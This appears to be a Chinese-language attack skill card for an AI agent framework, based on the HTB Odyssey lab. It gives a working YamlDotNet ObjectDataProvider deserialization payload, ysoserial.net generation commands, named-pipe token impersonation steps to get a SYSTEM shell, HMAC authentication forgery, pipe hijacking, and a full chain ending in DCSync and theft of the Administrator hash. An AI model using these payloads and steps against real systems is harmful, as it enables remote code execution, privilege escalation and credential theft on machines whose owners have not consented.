---
name: 'dotnet-pipe-yaml-deserialization'
description: 'Windows Named Pipe IPC + YamlDotNet 反序列化 RCE：ObjectDataProvider gadget + 缩进精度(2-space) + HMAC 认证绕过。Odyssey Step 12。'
disable-model-invocation: true
metadata: { domain: ad-win, tier: T3 }
---
> 📌 DSH 适配：本技能移植自 RS。原 read_skill/run_skill 调用 = 用 DSH 的 skill 工具按名加载对应技能；fleet/kali-mcp = 用 bash 后台任务与 subagent 工具实现。

# .NET Named Pipe + YamlDotNet 反序列化 RCE

> 来源：Odyssey HTB (Insane) Step 12 + NDSS 2021 学术论文 + ysoserial.net + CVE-2018-1000210
> 适用：Windows 上发现 Named Pipe 端点 + .NET 反序列化 sink

## 攻击面识别

```
[ ] 发现 \\.\pipe\<Name> → 可能是 IPC 端点
[ ] 另一端是 .NET 应用 → 可能用 YamlDotNet 做配置解析
[ ] 能发送 YAML payload → 反序列化 sink

检测:
  \\.\pipe\AegisStreamMgmt  (Odyssey)
  或其他命名的 Pipe → 用 ProcMon / pipelist 确认服务端
```

## Part A: YamlDotNet 反序列化 RCE

### 受影响版本

| 版本 | 行为 |
|------|------|
| ≤ 4.3.2 | `Deserialize()` 盲目 `Type.GetType(tag)` → 🔴 任意类型实例化 |
| ≥ 5.0.0 | 默认禁用 tag 类型解析 → 🟢 安全 |
| 8.x/9.x | source generator，永不调 `Type.GetType()` → 🟢 安全 |

### ObjectDataProvider Gadget Chain

```
YAML !<type> tag → Type.GetType("System.Windows.Data.ObjectDataProvider")
→ Activator.CreateInstance(ObjectDataProvider)
→ SetValue("ObjectInstance", Process对象)
→ SetValue("MethodName", "Start")
   → base.Refresh() → BeginQuery() → InvokeMethodOnInstance()
      → Process.Start(calc.exe)
```

### Payload（已验证 — YamlDotNet ≤ 4.3.2 + WPF 可用）

```yaml
!<!System.Windows.Data.ObjectDataProvider>
{ MethodName: Start,
  ObjectInstance: !<!System.Diagnostics.Process>
  { StartInfo: !<!System.Diagnostics.ProcessStartInfo>
    { FileName: cmd, Arguments: '/C calc.exe' }
  }
}
```

### 🔴 Odyssey 陷坑：缩进精度

```
YamlDotNet 默认: 2-space 缩进

第 1-9 次尝试都用 1-space → YamlException
第 10 次: 2-space → ✅

根因: YamlDotNet 版本不同 → 1-space 在某些版本是"同级 mapping"，
      在某些版本是"嵌套" → 缩进错 → 属性 setter 不触发

教训:
  ① 先验证 YAML 结构: 发送仅含 test: hello → 确认 parse 成功
  ② 再验证类型解析: !<!System.Object> → 确认 Type.GetType 被调
  ③ 再验证嵌套: key (2-space) → 确认属性 setter 生效
  ④ 最后加入 ObjectDataProvider gadget
```

### 生成工具

```bash
# ysoserial.net
ysoserial.exe -g ObjectDataProvider -f YamlDotNet -c "cmd /c whoami > C:\pwned.txt"

# 手工最小 payload (无 WPF 依赖时)
# 如果目标没有 PresentationFramework.dll → ObjectDataProvider 不可用
# → 回退到其他 gadget: TypeConfuseDelegate / LostFragment
```

### 备选 Gadget（无 WPF 时）

```
System.Configuration.Install.AssemblyInstaller → CAS bypass
System.Activities.Presentation.WorkflowDesigner → XAML RCE
System.Workflow.ComponentModel.Serialization.WorkflowMarkupSerializer
```

## Part B: Windows Named Pipe IPC 攻击

### Named Pipe Client Impersonation

```
前提: SeImpersonatePrivilege (NETWORK SERVICE / LOCAL SERVICE 默认有)

流程:
  ① CreateNamedPipe("\\.\pipe\evil", ...)
  ② 诱骗 SYSTEM 进程连接 pipe (PrintSpoofer / RoguePotato / GodPotato)
  ③ ConnectNamedPipe → ReadFile (至少读一次!)
  ④ ImpersonateNamedPipeClient → 获得客户端的 token
  ⑤ DuplicateTokenEx (TokenPrimary)
  ⑥ CreateProcessWithTokenW → SYSTEM shell
```

### Odyssey 的定制 IPC 协议

```
Pipe: \\.\pipe\AegisStreamMgmt
认证: viewer.key (客户端) + operator.key.enc (服务端)

流程:
  ① 读 viewer.key (DPAPI 解密) → KEK
  ② AES-GCM 解密 operator.key.enc → operator_key
  ③ 构造 HMAC-SHA256(operator_key, YAML_payload)
  ④ 发送 CONFIG_IMPORT <HMAC> <YAML_payload>
  ⑤ 服务端验证 HMAC → Deserialize(YAML_payload) → RCE

🔴 定制协议的核心: 绕过认证 + 到达反序列化 sink
  - viewer.key 是"观察者"密钥 → 能解密但不能操作
  - operator.key 是"操作者"密钥 → 从 viewer key 派生 → 伪装成操作者
  - HMAC 验证 → 不是猜测密码，是密钥派生
```

### Named Pipe ACL 滥用

```
# 如果 DACL 允许 FILE_GENERIC_WRITE (含 FILE_CREATE_PIPE_INSTANCE)
→ 创建额外 pipe 实例 → MITM 拦截 IPC 流量

# 如果服务没设置 FILE_FLAG_FIRST_PIPE_INSTANCE
→ 抢先创建同名 pipe → 伪装服务端
```

## Odyssey 完整 IPC→RCE 链

```
1. certipy shadow → aegis-stream-viewer 证书
2. WinRM to DC01 → svc-aegis-deploy
3. 枚举 \\.\pipe\ → 发现 AegisStreamMgmt
4. 作为 viewer 认证 → 读 viewer.key → DIAG_DECRYPT oracle → KEK
5. operator.key.enc → AES-GCM(KEK) → operator_key
6. 构造 YAML payload (ObjectDataProvider → cmd)
7. HMAC-SHA256(operator_key, payload) → 伪造认证
8. CONFIG_IMPORT → 服务端 Deserialize(YAML) → RCE as svc-aegis-stream
9. Rubeus as svc-aegis-stream → DCSync → Administrator hash

🔑 关键:
  - 不仅是反序列化 → 还有密钥派生链 (viewer→operator)
  - YAML 缩进 (2-space) → 版本差异
  - 不是直接 pipe 连接 → 需要 HMAC 认证
```

## 工具链

```
# 枚举 named pipes
pipelist.exe / pipelist64.exe -accepteula
powershell -c "[System.IO.Directory]::GetFiles('\\.\\pipe\\')"

# 测试 pipe 连接
echo "test" > \\.\pipe\<Name>  # 简单 send

# 反序列化 payload 生成
ysoserial.exe -g ObjectDataProvider -f YamlDotNet -c "<CMD>"

# 缩进验证
python3 -c "import yaml; print(yaml.safe_load(open('payload.yml')))"
# 或用 https://www.yamllint.com/

# HMAC 构造 (Python)
import hmac, hashlib, base64
hmac.new(operator_key, yaml_payload.encode(), hashlib.sha256).hexdigest()
```

## 🔴 重点

- YamlDotNet 版本决定一切 → ≤4.3.2 盲信 tag，≥5.0 默认禁用
- YAML 缩进精度比 tag 格式更重要 → 2-space 是默认
- Named Pipe 不只是 token 劫持 → 定制 IPC 协议有 HMAC/密钥派生/类型认证
- 反序列化前先解认证 → 不只找 sink，要找进入 sink 的完整路径
- 本卡即 .NET ObjectDataProvider 通用 gadget 的完整参考

**Why:** Odyssey 的 \\.\pipe\AegisStreamMgmt 是定制 IPC + YAML 反序列化 + HMAC 认证的组合。YAML 缩进 2-space vs 1-space 导致 9 次失败。
**How to apply:** 发现 named pipe → 枚举 IPC 协议 → 找到认证方式 → 找到反序列化 sink → 缩小版本测试 YAML 结构 → 最后 gadget RCE。
